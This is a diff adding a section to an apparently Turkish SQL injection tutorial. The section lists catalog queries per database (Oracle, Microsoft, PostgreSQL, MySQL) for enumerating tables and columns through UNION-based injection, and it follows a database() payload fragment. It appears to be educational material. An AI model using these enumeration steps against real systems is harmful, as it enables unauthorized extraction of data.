@@ -154,3 +154,28 @@ SELECT null, database(), null;
 ```
 
 Burada ikinci sorgu, ilk sorgu ile aynı sütun sayısına sahiptir (3 sütun) ve ikinci sütunda veritabanı ismini getirir. Böylece saldırgan veritabanı hakkında bilgi edinir.
+
+## UNION Based SQL Injection İle Veri Çıkartmak
+Aşağıda popüler veritabanları için işinize yarayabilecek veri çıkartma yolları listelenmiştir:
+
+Database contents
+Oracle:
+```sql
+SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+Microsoft:
+```sql
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+PostgreSQL:
+```sql
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+MySQL:
+```sql
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
